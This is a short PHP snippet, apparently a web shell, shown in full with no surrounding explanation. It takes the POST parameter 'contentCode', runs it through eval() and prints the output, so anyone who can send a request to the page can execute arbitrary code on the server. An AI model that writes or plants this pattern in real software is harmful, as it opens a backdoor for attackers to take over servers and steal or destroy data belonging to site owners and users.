<pre>
<?php
if (isset ( $_POST ['contentCode'] )) {
	$contentCode = $_POST ['contentCode'];
	$result = eval ( $contentCode );
	echo $result;
}
?>
</pre>